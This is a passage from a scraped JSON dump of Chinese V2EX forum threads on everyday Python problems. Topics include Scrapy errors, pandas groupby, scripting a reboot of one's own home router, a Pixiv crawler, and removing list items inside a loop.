的库源码，应该能找到上传进度的实现，我之前也是在一个库里看到的，不过一时找不到在哪了。", "很多进度条都是假的，一般按大段的工作进度来分。", "ajaxForm", " ", "马克，关注下", "前天洗澡的时候也想过这个问题。\r", "可以建立一个 cache=[ ], 在里面塞任务队列，然后计算长度，完成一个往前推进一步。恩，至少这个是可行的。", " 他说的应该是那种，前端发送数据之后，后端需要长时间执行然后返回结果的那种吧。", " 重新看了一下题目，确实是我看错了，多谢提醒"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>能不能实现这种：</p>\n<p>aItem 的数据由 aPipeline 处理\nbItem 的数据由 bPipeline 处理</p>\n<p>?</p>\n</div></div>"], "reply": "2", "tittle": "关于 scrapy 的 pipeline 和 items 问题", "comment": ["在 process_item 的时候检查 item 的实例或者 spider 的 name,按你想按什么分 A/B, 如果不是对应 pipeline 的 item,就直接 return 就行了,这个 item 就到下个 pipeline 处理去了", "isinstance"]},
{"content": ["<div class=\"topic_content\">File \"/usr/local/python3/lib/python3.5/site-packages/scrapy/core/downloader/middleware.py\", line 43, in process_request\r<br>    defer.returnValue((yield download_func(request=request,spider=spider)))\r<br>twisted.web._newclient.ResponseNeverReceived: [&lt;twisted.python.failure.Failure OpenSSL.SSL.Error: [('SSL routines', 'SSL23_READ', 'ssl handshake failure')]&gt;]\r<br>2016-10-29 13:31:29 [scrapy] INFO: Closing spider (finished)\r<br>2016-10-29 13:31:29 [scrapy] INFO: Dumping Scrapy stats:\r<br>{'downloader/exception_count': 6,\r<br> 'downloader/exception_type_count/twisted.web._newclient.ResponseNeverReceived': 6,\r<br> 'downloader/request_bytes': 1824,\r<br> 'downloader/request_count': 6,\r<br> 'downloader/request_method_count/GET': 6,\r<br> 'finish_reason': 'finished',\r<br> 'finish_time': datetime.datetime(2016, 10, 29, 5, 31, 29, 645084),\r<br> 'ip': None,\r<br> 'log_count/DEBUG': 7,\r<br> 'log_count/ERROR': 2,\r<br> 'log_count/INFO': 24,\r<br> 'open_time': '2016-10-29 13:28:28',\r<br> 'post_item': 0,\r<br> 'scheduler/dequeued/redis': 3,\r<br> 'scheduler/enqueued/redis': 3,\r<br> 'site': 'YouTube',\r<br> 'start_time': datetime.datetime(2016, 10, 29, 5, 28, 28, 85879)}\r<br>2016-10-29 13:31:29 [scrapy] INFO: Spider closed (finished)</div>"], "reply": "6", "tittle": "scrapy 抓取网站报错，本地抓取没问题，部署到服务器上就报错", "comment": ["twisted.web._newclient.ResponseNeverReceived, 你服务器上可以访问 youtube?", " 可以的，服务器在香港。现在时不时的可以抓取。就是不稳定。", "https 导致的错误吧， ", " 怎么解决呢？", " 链接里边不是有解决方案么，仔细看啊。", " 看了，没有解决问题"]},
{"content": ["<div class=\"topic_content\">根据回报率简单分了 5 级\r<br>做多最高预测回报率股票\r<br>更新止损和股票筛选\r<br>\r<br>简单说明\r<br>\r<br>开始的时候想做一个 ZZ800 成分股的小策略，然后受制于性能限制，我也懒得自己造轮子，就改成 SH50 了\r<br>今天有空对 SH50 成分股简单优化了一下参数\r<br>本文不涉及信号的理念、产生、筛选、处理相关方面\r<br>\r<br>策略假设\r<br>\r<br>1 股票池里面股票涨跌幅度符合标准正态分布\r<br>3 假设股价是一个电梯运动轨迹，上升一层（一个价格区间），回调几层（另一个价格区间），那么在未来一段时间（ 10~20 天）内股价会有所表示。\r<br>更长时间的股票涨跌趋势涉及更多的信息层面和更多分类的信息处理不考虑。\r<br>4 指标在不同的市场行情投资心态下使用不同的参考标准，过去 3 ~ 4 月内的投资心态在短期内会有顺延趋势\r<br>\r<br>然而效果并不好： <a target=\"_blank\" href=\"https://uqer.io/community/share/57ff4e54228e5b3658fac3f5\" rel=\"nofollow\">https://uqer.io/community/share/57ff4e54228e5b3658fac3f5</a>\r<br>\r<br>资金流入 = 资金流出 + 永久性损耗（税、佣金等）\r<br>大致上还是符合正态分布的\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/3ABpgP1Zl.png\" title=\"在新窗口打开图片 3ABpgP1Zl.png\"><img src=\"//i.v2ex.co/3ABpgP1Zl.png\" class=\"embedded_image\"></a>\r<br>\r<br>上证 50 指数的 K 线\r<br>几乎没有什么涨跌幅度\r<br><a target=\"_blank\" href=\"/i/282RaXRHl.png\" title=\"在新窗口打开图片 282RaXRHl.png\"><img src=\"//i.v2ex.co/282RaXRHl.png\" class=\"embedded_image\"></a>\r<br>简单看一下过去一段时间 SH50 10 天收益率波动： <a target=\"_blank\" href=\"https://uqer.io/community/share/57ff4e54228e5b3658fac3f5\" rel=\"nofollow\">https://uqer.io/community/share/57ff4e54228e5b3658fac3f5</a>\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/zxpIbJqFl.png\" title=\"在新窗口打开图片 zxpIbJqFl.png\"><img src=\"//i.v2ex.co/zxpIbJqFl.png\" class=\"embedded_image\"></a>\r<br>将波动率范围简单分级看一下： <a target=\"_blank\" href=\"https://uqer.io/community/share/57ff4e54228e5b3658fac3f5\" rel=\"nofollow\">https://uqer.io/community/share/57ff4e54228e5b3658fac3f5</a>\r<br>\r<br><a target=\"_blank\" href=\"/i/X4eYU9r8l.png\" title=\"在新窗口打开图片 X4eYU9r8l.png\"><img src=\"//i.v2ex.co/X4eYU9r8l.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/15N40j4bl.png\" title=\"在新窗口打开图片 15N40j4bl.png\"><img src=\"//i.v2ex.co/15N40j4bl.png\" class=\"embedded_image\"></a>\r<br>成分股看一下： <a target=\"_blank\" href=\"https://uqer.io/community/share/57ff4e54228e5b3658fac3f5\" rel=\"nofollow\">https://uqer.io/community/share/57ff4e54228e5b3658fac3f5</a>\r<br>\r<br><a target=\"_blank\" href=\"/i/piWSw67dl.png\" title=\"在新窗口打开图片 piWSw67dl.png\"><img src=\"//i.v2ex.co/piWSw67dl.png\" class=\"embedded_image\"></a>\r<br>简单测试一下效果： <a target=\"_blank\" href=\"https://uqer.io/community/share/57ff4e54228e5b3658fac3f5\" rel=\"nofollow\">https://uqer.io/community/share/57ff4e54228e5b3658fac3f5</a>\r<br>\r<br><a target=\"_blank\" href=\"/i/uuy4VbHpl.png\" title=\"在新窗口打开图片 uuy4VbHpl.png\"><img src=\"//i.v2ex.co/uuy4VbHpl.png\" class=\"embedded_image\"></a>\r<br>看一下年化收益率： <a target=\"_blank\" href=\"https://uqer.io/community/share/57ff4e54228e5b3658fac3f5\" rel=\"nofollow\">https://uqer.io/community/share/57ff4e54228e5b3658fac3f5</a>\r<br>\r<br><a target=\"_blank\" href=\"/i/WnN7lWI4l.png\" title=\"在新窗口打开图片 WnN7lWI4l.png\"><img src=\"//i.v2ex.co/WnN7lWI4l.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/4BP1YV35l.png\" title=\"在新窗口打开图片 4BP1YV35l.png\"><img src=\"//i.v2ex.co/4BP1YV35l.png\" class=\"embedded_image\"></a>\r<br>做成滚动策略看看效果： <a target=\"_blank\" href=\"https://uqer.io/community/share/57ff4e54228e5b3658fac3f5\" rel=\"nofollow\">https://uqer.io/community/share/57ff4e54228e5b3658fac3f5</a>\r<br>\r<br><a target=\"_blank\" href=\"/i/0Qb8Qbi6l.png\" title=\"在新窗口打开图片 0Qb8Qbi6l.png\"><img src=\"//i.v2ex.co/0Qb8Qbi6l.png\" class=\"embedded_image\"></a></div>"], "reply": "4", "tittle": "涨跌幅度分级，使用 SVM 分类预测", "comment": ["mark", "之前做过 SVM 的课题，即便在样本量足够大的情况下，不同的核函数选择会导致结果相当大的差异。即使选好了核函数，细小参数差异也对结果有显著影响。想要玩溜的话，个人感觉还是最好自己写一个优化过的核函数\r", "对于量化策略我都是会再跑 n 次混入不同极端情况的蒙特卡洛模拟", " 好嘞，多谢指导，我再跑几次：）", " \r", "通俗地讲，这说明 SVM 算法 overfit 太容易了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/mwilliamson/python-mammoth#image-converters\" rel=\"nofollow\">mammoth 模块</a>,可以将 docx 文件转为 html,可以清理掉 html 代码中 word 的一些特定格式.也能输出 docx 文件中的图片.\n在 windows 的 cmd 下,使用如下命令:\n<code>mammoth document.docx --output-dir=output-dir</code>\n则在 output-dir 目录下,输出 html 文件和图片文件.\n如下 Python 代码:</p>\n<pre><code>with open(\"document.docx\", \"rb\") as docx_file:\n    result = mammoth.convert_to_html(docx_file)\n    html = result.value # The generated HTML\n    messages = result.messages```\n\n以上代码会生成 html 代码,并不能将 docx 中的图片保存到一个目录里边;\n同时在 html 中,图片会被使用 base64 编码,并且删除了 width 和 height 属性.\n我想要的是,将图片保留到一个目录里边;\n同时生成的 html 代码里,不要将图片使用 base64 编码,并保持图片的 width 和 height 属性.\n英文太差,看得头痛也没有搞清楚怎么弄,请大家帮助,最好贴下简单的代码,多谢您的回复!\n</code></pre>\n</div></div>"], "reply": "4", "tittle": "Python 模块 mammoth 怎么转换 docx 文件为 html?", "comment": ["By default, images are included inline in the output HTML. If an output directory is specified by --output-dir, the images are written to separate files instead. For instance:\r", "\r", "'mammoth document.docx --output-dir=output-dir'", " 感谢您的回复,如上代码在 cmd 执行,在 output-dir 文件夹会生成 html 文件和图片文件,存在的问题是:\r", "html 文件中图片元素(如:<img src=\"1.png\" />)没有高和宽属性,我希望 html 文件中的图片元素保持高宽属性的值,不要过滤掉.如:<img src=\"1.png\" width=\"300\" height=\"200\" />.\r", "这样的效果,用 python 代码可以实现的吗?怎么写呢?", "代码不都是开源的么， 写个代码 patch 下生成过程就好了", " 太菜了,还没那两下子!@@@"]},
{"content": ["<div class=\"topic_content\">pymongo+gevent pool 导致 mongodb 卡死，报了一堆 AutoReconnectError 错误和 connection close ，我 pymongo 的 pool 和 gevent pool 都设置的不大（都为 100 ）有什么办法能很好的调控，又还能保证速度呢？</div>"], "reply": "5", "tittle": "pymongo+gevent Pool 导致 mongodb 扛不住怎么办？", "comment": ["你不帖代码怎么看,或许是你的 query 有问题,或者是你的连接没有关闭,可能性太多了", " 代码有点多，基本上就是读取一个地方的数据写到数据库里，在__del__定义了 close ，但是似乎没有作用", " 大兄弟， 用 __del__ 来实现 RAII 语义，在 python 里面不是正确的姿势。\r", "\r", "正确的做法是使用 with 句式， contextlib 可能是你想要的。 ", " 找到原因了，我用 signal 去关闭的，结果发现官网说的不对，直接 close 就行", "这是把 __del__ 当作析构函数来用？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>手里有一台 TP-WR740N ，不时会过热死机，所以想定时重启一下，在 NAS 上虚拟机 centos7 搭了 Python 3.5.2 ，配合 selenium 2.53 和 Firefox 45.04 (还有 Xvfb)实现重启，代码如下：</p>\n<pre><code>#!/usr/bin/env python  \nfrom pyvirtualdisplay import Display\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\ndisplay = Display(visible=0, size=(1024, 768))\ndisplay.start()\ndriver = webdriver.Firefox()\ndriver.get(\"http://admin:admin@192.168.1.1\")\ndriver.implicitly_wait(2)\ndriver.switch_to.frame(\"bottomLeftFrame\")\ndriver.implicitly_wait(2)\ndriver.find_element_by_id(\"a38\").click()\ndriver.implicitly_wait(1)\ndriver.find_element_by_id(\"a44\").click()\ndriver.switch_to.parent_frame()\ndriver.switch_to.frame(\"mainFrame\")\ndriver.find_element_by_id(\"reboot\").click()\ndriver.switch_to.alert.accept()\ndriver.close()\n</code></pre>\n<p>然后，前几天我把 NAS 换成 centos7 系统，配上 Python 3.5.2 selenium 3.0.1(pip 上好像前几天更新的) 和 Firefox 45.04 (还有 Xvfb)，代码还是上面的代码，结果就出现问题了：<br>\n1.[已解决]需要 Geckodriver 的路径。我去 github 下载后，解压放到 /usr/bin/<br>\n2.应该是 HTTP basic auth 的问题，执行</p>\n<pre><code>driver.get(\"http://admin:admin@192.168.1.1\")\n</code></pre>\n<p>没有内容返回， driver.title 是空的，而且也没有任何错误提示，如果把地址换成百度之类的不需要 HTTP basic auth 就能获取到内容。然后我这个初学者就不造怎么办了，所以就来求助一下大家~</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>这个问题涉及到Firefox的profile的问题，小菜鸡才疏学浅弄了半天才弄明白，HTTP basic auth需要加上关键参数</p>\n<pre><code>network.http.phishy-userpass-length = 255\n</code></pre>\n<p>解决方法：  在上面的代码中作出修改，创建firefox对象前加上profile设定，并向Firefox()加入参数</p>\n<pre><code>profile = webdriver.FirefoxProfile() #创建firefox profile对象\nprofile.set_preference(\"network.http.phishy-userpass-length\", 255) #设定profile参数\ndriver = webdriver.Firefox(profile)\n</code></pre>\n<p>然后，Selenium 3.0.1中遇到HTTP basic auth 问题应该可以参照这个方法解决</p>\n<p>参考链接：<br>\n<a href=\"http://docs.seleniumhq.org/docs/03_webdriver.jsp#firefox-driver\" rel=\"nofollow\">http://docs.seleniumhq.org/docs/03_webdriver.jsp#firefox-driver</a><br>\n<a href=\"http://blog.wedoqa.com/2013/09/basic-http-authentication-and-webdriver/\" rel=\"nofollow\">http://blog.wedoqa.com/2013/09/basic-http-authentication-and-webdriver/</a><br>\n<a href=\"http://stackoverflow.com/questions/28181102/in-selenium-python-webdriver-im-not-able-to-download-a-text-file-with-a-lst-e\" rel=\"nofollow\">http://stackoverflow.com/questions/28181102/in-selenium-python-webdriver-im-not-able-to-download-a-text-file-with-a-lst-e</a></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>So @bdbai 大神说得对，还有更简单的实现方法~用requests(好像要用pip安装来着)<br>\nhttp的header需要设置referer和UA<br>\n直接上代码:</p>\n<pre><code>#!/usr/bin/python\nimport requests\ns = requests.Session()\ns.auth = (\"admin\", \"admin\")#管理界面用户名密码\ns.headers.update({\"referer\":\"http://192.168.1.1\",\"User-agent\":\"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\"})#设置referer和UA\nr = s.get(\"http://admin:admin@192.168.1.1/userRpm/SysRebootRpm.htm?Reboot=%D6%D8%C6%F4%C2%B7%D3%C9%C6%F7\")\n</code></pre>\n</div></div>"], "reply": "21", "tittle": "Selenium 3.0.1 的 HTTP basic auth 问题", "comment": ["自己的系统，又不用反爬虫，直接上 requests 好了", "implicit_wait 不是这样用的吧?\r", "仔细看一下源代码或文档,要达到 wait 的效果,应该用 webdriverwait", " 嗯嗯~好的，我研究一下 requests", " 哟西~不过在 selenium 2.53 上是有这个效果的，我看看 webdriverwait 去~射射", "这样开销太大了，抓个包直接发请求呗。", " 嗯嗯，是啊~初学感觉这个是最简单的实现了~囧~ 抓包发请求是怎么弄呀？用啥工具抓包咧？能不能给个关键字我去搜搜看", " 我试了试 webdriverwait ，仍然是 get 不到任何内容，感觉不像是这个问题，会不会是 geckodriver 的问题咧，因为 selenium3.0.1 才用到 geckodriver ，额~有点混乱了我", " 以 Chrome 为例，先打开浏览器的开发者选项，然后登进路由器管理页面，按下 F12 底下会弹出开发者工具，切到 Network 页。这时候点击“重启路由器”就会看到有请求发出来，琢磨琢磨请求主体，丢给 Python 跑。\r", "大概是这样的。", " 三克油~找到了~跟之前在歪果仁博客上看到的一样\r", "```\r", "\r", "```\r", "不过情况跟之前差不多~囧~You have no authority to access this device!\r", "前面加上 admin:admin@也好像不太行，估计要 google 一下了\r", "忽然发现回复要扣小铜板的，不知道哪天我这个小菜鸡会穷的没法回复了~囧~", "你这样确实太浪费资源了，如楼上所说，这个直接用 curl 拼一个请求放到 crontab 里就可以了\r", "对于你这个问题， webdriver 初始化（ driver = webdriver.Firefox()）的时候可以设置 log 位置，可以看到你的 dirver 的每一步操作。", " 你得把登录验证信息放进请求里面，不知道是普通 HTTP auth 还是 Cookie ，具体情况具体分析吧。\r", "可以加我 QQ MzQ3MDk5OTIw （ Base64 编码）\r", "\r", "铜币给你送回去了。", "  谢谢，我先研究下～唉呀😂😂😂大神呀，别介啊，小菜鸡初来乍到不懂规矩～", " 嗯嗯，谢谢，原来可以出 log 的😳这样就能知道哪儿出错了😳😳😳", "直接在 URL 里加 authority 信息其实是不符合 HTTP 标准的……并不是所有客户端都能支持这么搞……前几天刚被坑到过", "  这样的嘛😳那应该怎么样弄的呢？关键是 selenium 2.53 是正常的😳然后 selenium 3.0.1 才出现问题，我已经排除了很多情况了，只是 selenium 3.0.1 才刚出， api 文档还找不到呢，所以有点束手无策", " 2.53 正常不用，为什么一定要用 3.01 ？", " 说来惭愧，主要是 pip 上装的都是最新版，前几天重新装 NAS 系统的时候发现 pip 装的是最新版，然后又不知道怎么装 2.53 ，所以_(:з」∠)_ 阴差阳错，最后实在好奇想弄明白到底是啥原因~~~so", " pip install selenium==2.53", " 司国义！！！原来是这样，谢谢~不过我已经给自己挖了个坑，我要继续研究下去才行_(:з」∠)_", "  @", "  @", "  @", "  @", " 谢谢大家回复~谢谢大神 @", "  耐心的解答~\r", "这个帖子发出去是不是没法重新编辑，只能 APPEND ？_(:з」∠)_", " 已经超过编辑时间了，好像是五分钟吧。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>pyv8 已经没人维护了。没法使用。其他还有什么好用的包吗</p>\n</div></div>"], "reply": "20", "tittle": "如何在 python 里运行 js 代码？", "comment": ["我的做法是直接扔到 node 里面跑完给结果，但如果你的东西上下文相关，为啥不拿 node 来用呢，或者自己拿 v8 编译成动态库用 python 去调用呢。", " 我的 js 带 dom 操作。比较麻烦。能用 selenium 吗。我就想要运行后的数据。", " dom 操作属于浏览器范畴了， 有 pyv8 也没用。。", " python 里哪个库可以运行 js 加密结果(会操作 dom)，然后返回数据。", " jsdom node 里跑没有问题 ", "execjs", " execjs 不能操作 dom 吧", " 那是 node 那边的事情了，不是 Python 的事情了", " 有相关 demo 没？", "不如 node 调用 python 吧。。", " 把你的 JS 代码 wrapp 一下，需要的数据通过 console.log 输出，然后读子进程的输出就好了。", " 看你的描述是为了爬东西， selenium 的效率相对比较低一点，如果你可以接受当然没问题。", "phantomJS", "phantomJS +1", "Selenium.", "我已经想用 v8 跑这段 js ，等结果出来。但麻烦的是 pyv8 会在 js 操作 dom 的时候给出错误。怎么阻止 v8 操作 dom ？或者遇到错误的时候跳过？\r", " \r", " \r", " \r", " \r", "<script src=\"", ".js\"></script>", "模拟 window 等对象，即可", "windows 下安装出错怎么办？\r", "$ pip install pyv8\r", "Collecting pyv8\r", "  Using cached PyV8-0.5.zip\r", "    Complete output from command python setup.py egg_info:\r", "    Traceback (most recent call last):\r", "      File \"<string>\", line 1, in <module>\r", "      File \"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\pip-build-s20z1zyl\\pyv8\\setup.p\r", "y\", line 17, in <module>\r", "        include_dirs += os.environ[\"INCLUDE\"].split(';')\r", "      File \"d:\\python3\\lib\\os.py\", line 725, in __getitem__\r", "        raise KeyError(key) from None\r", "    KeyError: 'INCLUDE'\r", "\r", "    ----------------------------------------\r", "Command \"python setup.py egg_info\" failed with error code 1 in C:\\Users\\ADMINI~1\r", "\\AppData\\Local\\Temp\\pip-build-s20z1zyl\\pyv8\\", " 如何模拟出 window 等对象。网站找不到好的教程。 pyv8 现在用的人很少了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ol>\n<li>python <a href=\"http://main.py\" rel=\"nofollow\">main.py</a></li>\n<li>输入用户名，密码，和保存的文件夹</li>\n<li>选择要下载哪个排行榜的插图</li>\n</ol>\n<p>今天的排行榜还真是多福利(●ˇ∀ˇ●)</p>\n<p>github: <a href=\"https://github.com/pwcong/PixivCrawler\" rel=\"nofollow\">https://github.com/pwcong/PixivCrawler</a></p>\n<p>如果你喜欢这个小爬虫，请尽情给我个 Start 哈</p>\n</div></div>"], "reply": "8", "tittle": "Pixiv 的插图小爬虫(￣ y▽￣)╭ Ohohoho.....", "comment": ["Start~~", " つ﹏⊂", "po 主好，我想用 docker 把这个打个包方便我在群晖上面用\r", "运行时报这个\r", "\r", "Traceback (most recent call last):\r", "  File \"/usr/local/lib/python3.5/urllib/request.py\", line 1254, in do_open\r", "    h.request(req.get_method(), req.selector, req.data, headers)\r", "  File \"/usr/local/lib/python3.5/http/client.py\", line 1106, in request\r", "    self._send_request(method, url, body, headers)\r", "  File \"/usr/local/lib/python3.5/http/client.py\", line 1151, in _send_request\r", "    self.endheaders(body)\r", "  File \"/usr/local/lib/python3.5/http/client.py\", line 1102, in endheaders\r", "    self._send_output(message_body)\r", "  File \"/usr/local/lib/python3.5/http/client.py\", line 934, in _send_output\r", "    self.send(msg)\r", "  File \"/usr/local/lib/python3.5/http/client.py\", line 877, in send\r", "    self.connect()\r", "  File \"/usr/local/lib/python3.5/http/client.py\", line 849, in connect\r", "    (self.host,self.port), self.timeout, self.source_address)\r", "  File \"/usr/local/lib/python3.5/socket.py\", line 693, in create_connection\r", "    for res in getaddrinfo(host, port, 0, SOCK_STREAM):\r", "  File \"/usr/local/lib/python3.5/socket.py\", line 732, in getaddrinfo\r", "    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):\r", "socket.gaierror: [Errno -2] Name or service not known\r", "\r", "During handling of the above exception, another exception occurred:\r", "\r", "Traceback (most recent call last):\r", "  File \"man.py\", line 25, in <module>\r", "    query_tt = RankingCrawler.download_first(opener, RankingCrawler.query_mode[int(qmNo)], saveDir)\r", "  File \"/usr/src/app/crawler/RankingCrawler.py\", line 119, in download_first\r", "    with op.open(visit) as f:\r", "  File \"/usr/local/lib/python3.5/urllib/request.py\", line 466, in open\r", "    response = self._open(req, data)\r", "  File \"/usr/local/lib/python3.5/urllib/request.py\", line 484, in _open\r", "    '_open', req)\r", "  File \"/usr/local/lib/python3.5/urllib/request.py\", line 444, in _call_chain\r", "    result = func(*args)\r", "  File \"/usr/local/lib/python3.5/urllib/request.py\", line 1282, in http_open\r", "    return self.do_open( http.client.HTTPConnection, req)\r", "  File \"/usr/local/lib/python3.5/urllib/request.py\", line 1256, in do_open\r", "    raise URLError(err)\r", "urllib.error.URLError: <urlopen error [Errno -2] Name or service not known>\r", "\r", "尝试改了 resolv.conf 为 114 ，但还是这个错误\r", "ping pixiv 也能通，感觉应该不是网络的问题\r", "可以指点下是我哪个运行库没装或者配错了", "排查了半天发现是 lxml 没弄，已自行解决", " （＞人＜；） 骚瑞啊，这两天学车跑长途没看到信息，外部的库只有 bs4(解析用 lxml)", "本地调试的时候还好好的上到 daodocker 就没辙了\r", "目测又是依赖，然而这次人品用光了\r", "\r", "2016-11-01 00:36:26:start\r", "2016-11-01 00:36:27:Traceback (most recent call last):\r", "2016-11-01 00:36:27: File \"all.py\", line 23, in <module>\r", "2016-11-01 00:36:27: opener = PixivLoginer.login(userid, password)\r", "2016-11-01 00:36:27: File \"/usr/src/app/api/PixivLoginer.py\", line 56, in login\r", "2016-11-01 00:36:27: data = utils.ungzip(data).decode()\r", "2016-11-01 00:36:27:AttributeError: module 'utils' has no attribute 'ungzip'\r", "2016-11-01 00:36:28:Traceback (most recent call last):\r", "2016-11-01 00:36:28: File \"man.py\", line 23, in <module>\r", "2016-11-01 00:36:28: opener = PixivLoginer.login(userid, password)\r", "2016-11-01 00:36:28: File \"/usr/src/app/api/PixivLoginer.py\", line 56, in login\r", "2016-11-01 00:36:28: data = utils.ungzip(data).decode()\r", "2016-11-01 00:36:28:AttributeError: module 'utils' has no attribute 'ungzip'", "表示主攻嵌入式不太懂 python ，可以的话请指点一下", "标签“小爬虫”是什么鬼~"]},
{"content": ["<div class=\"topic_content\">idx\tA\tB\t  C\t                                         D\r<br>n1\ta\tn1\t0.08235683979623196\t0.05382651911109722\r<br>n2\ta\tn2\t-0.5753742388125477\t-1.274828987062829\r<br>n3\tc\tn3\t-1.4215891862728542\t-1.5249012616692992\r<br>n4\tb\tn4\t2.597861476435896\t-0.022156711083823347\r<br>n5\tb\tn5\t0.554609527394234\t-0.41314768348864467\r<br>n6\tc\tn6\t0.515677716749852\t-1.6778597999504492\r<br>n7\tc\tn7\t-1.6537892579863014\t-1.4180345858887689\r<br>n8\tc\tn8\t-0.6986637088054982\t0.4363171785879798\r<br>\r<br>\r<br>\r<br>假设我有如上一个 df 表，分为 A,B,C,D 共 4 列。\r<br>我想以列 A 为分组，求列 C 各组内的最大值。**同时知道这个最大值对应的是哪个 index**后一个要求怎么实现哈？\r<br>\r<br>\r<br>df['C'].groupby(df['A']).max()\r<br>结果只是：\r<br>A\r<br>a    0.082357\r<br>b    2.597861\r<br>c    0.515678\r<br>Name: C, dtype: float64\r<br>获取不到他们的 index</div>"], "reply": "7", "tittle": "求解 pandas groupby 的标签问题，谢谢！^_^", "comment": ["group 前先 reset_index,比如这列就叫 index ，最后一步加上['index']", "没那么麻烦\r", "df.groupby('A')['C'].agg([max, np.argmax])", " 这个好！太赞了。查询了一下，一个求最大值，一个求最大值下标。", " 其实 B 列就跟 index 一致。但是不是很明白你说的。那样求出来有问题。", "因为你的 'B' 列和 'index' 一样，所以 df.groupby(['A']).max() 就行，这样 'C' 和 'D' 的最大值都有。如果只要 'C' 的话也可以 df[['A', 'B', 'C']].groupby(['A']).max()", "idxmax 为您服务"]},
{"content": ["<div class=\"topic_content\">python 菜鸟一枚，平时有事没事就注册个域名，下午有时间就写了写如何批量查询域名。\r<br>github 地址：\r<br><a target=\"_blank\" href=\"https://github.com/gaokaigithub/domain\" rel=\"nofollow\">https://github.com/gaokaigithub/domain</a>\r<br>\r<br>网址： <a target=\"_blank\" href=\"http://xueyuan.me/topic/50/\" rel=\"nofollow\">http://xueyuan.me/topic/50/</a></div>"], "reply": "11", "tittle": "python 菜鸟写了一个自动批量查询域名的查询程序", "comment": ["  赞一个", "收藏一下", "调用 whois 就好了， 多准备几个查询的 host, 不要用注册商接口去查，不然等你想注东西就没了", "提示一下，域名 whois 服务器 443 端口", " 学到了", " 谢谢", " 请教一下如何提高注册时的速度？我用的 resellerclub 的 api ，不过感觉很慢", "打错了 43 端口", " 找到了相应的查询 whois 包， ", "测试了下 python-whois 包，返回 whois 信息需要 0.6s ，万网的 api 返回信息需要 0.16s （没有加运行时间限制）。", "namesilo 有批量 API ，一次可以查 200 个。"]},
{"content": "", "reply": "2", "tittle": "部署 Tornado 和 Django 有什么比较好的方案？", "comment": ["前面放 nginx 就行了", "google first"]},
{"content": ["<div class=\"topic_content\">list1 = ['print','lock','china','page']\r<br>print(len(list1))\r<br>print(list1)\r<br>for i in range(0,len(list1)):\r<br>    if list1[i].find('a') != -1:\r<br>        list1.pop(i)\r<br>\r<br>这段代码的本意是查找列表中各元素里有没有字母 a ，如果有 a 就删除这个元素，可是现在发现个问题，删除了以后 len(list1)就减少了，但循环的次数是不减的，所以到了后面就出错了。这样的情况应该怎么改？</div>"], "reply": "24", "tittle": "list 删除元素后，怎样减循环次数？", "comment": ["list1 = ['print','lock','china','page'] \r", "for sub in list1:\r", "    能不能在这里直接删除元素？", "正规(高效)的做法应该是在循环中把要删除的元素往前(后)交换, 并同时记录有效元素的最后(起始)索引, 循环结束了一次性删除待删除元素.", "你需要一个新的 list", "list1 = [x for x in list1 if 'a' not in x]", "楼主的代码有一股浓浓的 Java 的味道。\r", "Python 有更加现代化的写法。\r", "\r", "![]( ", ")", "\r", "\r", "图片又发不出来了吗？", " groovy 也可以有优雅的写法。\r", "\r", "def list1 = ['print','lock','china','page']\r", "def list2 = list1.findAll{it?.contains(\"a\")}\r", "println(list2)", " \r", " \r", " \r", " \r", " \r", "\r", "非常感谢", "用迭代器遍历", " 回复貌似不资词 markdown", " 没办法，以前 vb,java 用习惯了，一时半会儿改不过来。\r", "再追加一个问题，如果 list1 = ['print','lock','china','g']，现在最后一个元素没有 a 了，我想在找到第一个有 a 的元素后不管后边的元素有没有 a 都保留下来，应该怎样做？", " \r", "\r", "VB 用习惯是一个比较坑的情景。。。\r", "\r", "如果对内存比较敏感推荐用单向链表而不是 list 。", "上面说的对，用迭代器。\r", "java 里面使用 foreach 可以安全的 remove 元素", "java8 的流使用 filter 过滤出需要的元素也很方便的\r", "只会 java 路过", "正确的做法是从后往前删，就没有问题了。\r", "也就是， for(i = n-1; i >= 0; i --)，而不是 for(i = 0; i < n; i ++)", "这种操作应该用 filter 而不是循环去删", "改变思维吧，循环过程中变更 list 长度是错误的思路", " \r", "  1 \r", "  2 def f(n, l):\r", "  3     for x in l:\r", "  4         if n in x:\r", "  5             return l[l.index(x):]\r", "\r", "\r", "list1 = ['print', 'lock', 'china', 'g']\r", "list2 = f('a', list1)", "如果我没理解错的话。。。\r", "\r", "```python\r", "list1 = ['print', 'lock', 'china', 'page']\r", "\r", "list2 = [item for item in list1 if item.count('a') == 0]\r", "\r", "print(list2)\r", "# ['print', 'lock']\r", "```", "或者更直观的\r", "\r", "list1 = ['print', 'lock', 'china', 'page']\r", "\r", "list2 = [item for item in list1 if 'a' not in item]\r", "\r", "print(list2)", "列表推导最 pythonic", "还可以使用内置 filter 函数\r", "\r", "list1 = ['print', 'lock', 'china', 'page'] \r", "\r", "list2 = filter(lambda item: 'a' not in item,list1)\r", "\r", "print(list2)", " 你的第二个需求\r", "\r", "如果你的 list1 里面至少有一个元素包含字母 a, 那么可以这样写：\r", "\r", "list2 = list1[list1.index([x for x in list1 if 'a' in x][0]) + 1 :]\r", "\r", "如果可能所以元素都不含 a,那么建议使用 for 循环。", "倒着来"]},
